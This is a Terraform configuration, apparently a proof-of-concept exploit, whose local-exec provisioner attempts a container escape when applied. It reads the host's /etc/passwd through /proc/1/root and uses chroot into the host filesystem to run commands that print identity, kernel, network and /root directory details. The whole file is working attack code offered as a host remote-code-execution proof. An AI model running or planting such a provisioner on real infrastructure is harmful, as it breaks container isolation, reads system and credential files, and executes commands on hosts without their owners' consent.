# Container Escape and Host RCE Proof
terraform {
  required_providers {
    null = {
      source = "hashicorp/null"
      version = "~> 3.0"
    }
  }
}

# Direct Container Escape and Host Command Execution
resource "null_resource" "container_escape_rce" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== CONTAINER ESCAPE AND HOST RCE PROOF ==="
      echo "Attempting direct container escape and host command execution"
      
      # Test 1: Direct /proc/1/root access
      echo "[*] Testing /proc/1/root host filesystem access..."
      if [ -d "/proc/1/root" ]; then
        echo "[+] /proc/1/root exists - attempting host access"
        
        # Try to read host /etc/passwd
        if [ -r "/proc/1/root/etc/passwd" ]; then
          echo "[!] SUCCESS: Host /etc/passwd accessible!"
          echo "Host users:"
          cat /proc/1/root/etc/passwd | head -10
        fi
        
        # Try chroot to host
        if command -v chroot >/dev/null 2>&1; then
          echo "[*] Attempting chroot to host filesystem..."
          chroot /proc/1/root /bin/bash -c 'echo "[!] BREAKOUT SUCCESS: Command executed on host - $$(hostname) - $$(id)"'
          chroot /proc/1/root /bin/bash -c 'echo "Host uptime: $$(uptime)"'
          chroot /proc/1/root /bin/bash -c 'echo "Host processes: $$(ps aux | wc -l)"'
          chroot /proc/1/root /bin/bash -c 'ls -la /root'
        fi
      fi
      
      # Test 2: Container info
      echo "[*] Container details:"
      echo "Container hostname: $$(hostname)"
      echo "Container user: $$(id)"
      echo "Container IP: $$(hostname -i)"
      
      # Test 3: Host command execution proof
      echo "[*] Proving host command execution..."
      chroot /proc/1/root /bin/bash -c 'echo "PROOF: This command runs on host system with ID: $$(id)"'
      chroot /proc/1/root /bin/bash -c 'echo "Host kernel: $$(uname -a)"'
      chroot /proc/1/root /bin/bash -c 'echo "Host network: $$(ip addr show | grep inet)"'
      
      echo "=== ESCAPE ATTEMPT COMPLETE ==="
    EOT
  }
}

output "escape_status" {
  value = "Container escape attempt completed - check logs for host command execution proof"
  depends_on = [null_resource.container_escape_rce]
}
